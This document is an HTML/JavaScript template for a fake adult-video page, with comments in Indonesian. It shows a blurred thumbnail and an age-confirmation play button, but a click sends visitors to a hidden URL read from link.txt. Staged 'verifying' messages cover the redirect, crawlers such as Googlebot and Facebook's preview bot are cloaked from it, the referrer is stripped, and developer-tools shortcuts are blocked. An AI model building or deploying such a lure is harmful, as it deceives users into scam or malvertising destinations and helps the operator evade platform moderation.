<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="referrer" content="no-referrer">
    <title>Secure Media Access | Restricted Content</title>
    
    <meta property="og:title" content="Private Content Access" />
    <meta property="og:description" content="Secure cloud delivery for requested media. High-speed streaming enabled." />
    <meta property="og:image" content="https://vidley.pw/tombolplay.jpg" />
    <meta property="og:type" content="website" />

    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');
        
        body { 
            background-color: #050505; 
            color: #ffffff; 
            font-family: 'Inter', sans-serif;
            user-select: none; 
            -webkit-user-select: none; 
            touch-action: manipulation;
            overflow: hidden;
        }
        
        .glass {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }

        .pulse-red {
            animation: pulse-red-glow 2s infinite;
        }
        @keyframes pulse-red-glow {
            0% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.6); transform: scale(1); }
            50% { box-shadow: 0 0 30px 10px rgba(239, 68, 68, 0.3); transform: scale(1.02); }
            100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.6); transform: scale(1); }
        }

        .text-glow { text-shadow: 0 0 20px rgba(255, 255, 255, 0.2); }
        
        .age-badge {
            border: 2px solid #ef4444;
            color: #ef4444;
            padding: 2px 8px;
            border-radius: 6px;
            font-weight: 900;
            font-size: 14px;
        }

        ::-webkit-scrollbar { display: none; }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4" oncontextmenu="return false;">

    <div class="w-full max-w-md glass rounded-[2.5rem] overflow-hidden relative shadow-[0_40px_80px_-15px_rgba(0,0,0,0.8)] border border-white/10">
        
        <div id="videoArea" class="relative w-full h-[55vh] max-h-[500px] bg-black overflow-hidden flex items-center justify-center cursor-pointer group">
            
            <video id="vidThumb" class="w-full h-full object-cover opacity-30 blur-[20px] transition-all duration-700 group-hover:opacity-40" playsinline preload="metadata" muted></video>

            <div id="playOverlay" class="absolute inset-0 flex flex-col items-center justify-center z-20 p-8 text-center">
                
                <div class="mb-6 flex flex-col items-center animate-bounce">
                     <span class="age-badge mb-2">18+</span>
                     <p class="text-white/60 text-[10px] uppercase tracking-[0.3em] font-bold">Adults Only Content</p>
                </div>

                <div id="iconBox" class="w-20 h-20 bg-red-600 rounded-full flex items-center justify-center shadow-2xl pulse-red mb-6 transition-transform duration-300 group-hover:scale-110">
                    <i data-lucide="play" class="w-8 h-8 text-white fill-current ml-1"></i>
                </div>
                
                <h1 class="text-white text-2xl font-black tracking-widest mb-2 uppercase text-glow">CONFIRM AGE</h1>
                <p class="text-white/40 text-[11px] leading-relaxed max-w-[200px]">By clicking play, you confirm that you are over 18 years of age.</p>
            </div>
            
            <div id="loader" class="hidden absolute inset-0 flex items-center justify-center bg-[#050505] z-40 backdrop-blur-3xl">
                <div class="flex flex-col items-center">
                    <div class="relative w-16 h-16 mb-6">
                        <div class="absolute inset-0 rounded-full border-t-2 border-red-600 animate-spin"></div>
                        <div class="absolute inset-2 rounded-full border-b-2 border-white/20 animate-spin-slow"></div>
                    </div>
                    <span id="loadText" class="text-white text-[10px] font-bold tracking-[0.4em] uppercase italic animate-pulse">Checking Permissions...</span>
                </div>
            </div>
        </div>

        <div class="p-6 bg-[#0a0a0c] flex flex-col items-center border-t border-white/5">
            <div class="flex gap-4 mb-4 text-white/30 text-[10px] font-medium uppercase tracking-tighter">
                <span>Anti-Clone Active</span>
                <span>•</span>
                <span>Referrer Stripped</span>
                <span>•</span>
                <span>Node Secure</span>
            </div>
            
            <div class="text-[9px] text-white/10 text-center uppercase tracking-widest leading-loose">
                Verified Access Only. Security Protocol 4.1 Enabled.
            </div>
        </div>
    </div>

    <script>
        lucide.createIcons();

        // --- 1. CONFIGURATION ---
        const AUTHORIZED_DOMAIN = "yourdomain.com"; // GANTI DENGAN DOMAIN ANDA SENDIRI
        const CONFIG_FILE = "link.txt"; // File tempat Anda menyimpan URL
        const FALLBACK_SITE = "https://cdn.videy.co"; 

        // --- 2. ANTI-CLONE SECURITY ---
        // Blokir Shortcut Developer Tools
        document.addEventListener('keydown', function(e) {
            if (e.keyCode == 123 || 
                (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) || 
                (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
                e.preventDefault();
                return false;
            }
        });

        // Domain Lock Check
        function isAuthorized() {
            if (window.location.hostname.indexOf(AUTHORIZED_DOMAIN) === -1) {
                // Jika domain tidak cocok, tombol tidak akan berfungsi
                return false;
            }
            return true;
        }

        // --- 3. REDIRECT LOGIC ---
        const isBot = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|Facebot|facebookplatform|ia_archiver|visionutils/i.test(navigator.userAgent);
        
        async function handleAccess() {
            if(isBot) return;

            // Cek Domain Lock
            if(!isAuthorized()) {
                console.error("Unauthorized Domain.");
                return;
            }

            const loader = document.getElementById("loader");
            const loadText = document.getElementById("loadText");
            loader.classList.remove('hidden');

            try {
                // Mengambil URL dari file TXT
                const response = await fetch(CONFIG_FILE + "?t=" + new Date().getTime());
                const targetUrl = (await response.text()).trim();

                if(!targetUrl || targetUrl === "") {
                    loadText.innerText = "Error: Config Missing";
                    return;
                }

                setTimeout(() => { loadText.innerText = "Securing Path..."; }, 500);
                setTimeout(() => { loadText.innerText = "Verifying Origin..."; }, 1000);
                
                setTimeout(() => {
                    const link = document.createElement('a');
                    link.href = targetUrl;
                    link.rel = "noreferrer";
                    link.click();
                }, 1600);

            } catch (err) {
                loadText.innerText = "Connection Failed";
                console.error(err);
            }
        }

        document.getElementById("videoArea").addEventListener("click", handleAccess);

        // Thumbnail loader logic
        let videoId = window.location.pathname.split('/').pop().trim();
        if (videoId && videoId.length > 3 && videoId !== "index.html") {
            let filename = videoId.includes('.') ? videoId : videoId + ".mp4";
            document.getElementById("vidThumb").src = FALLBACK_SITE + "/" + encodeURIComponent(filename) + "#t=0.5";
        }
    </script>
</body>
</html>
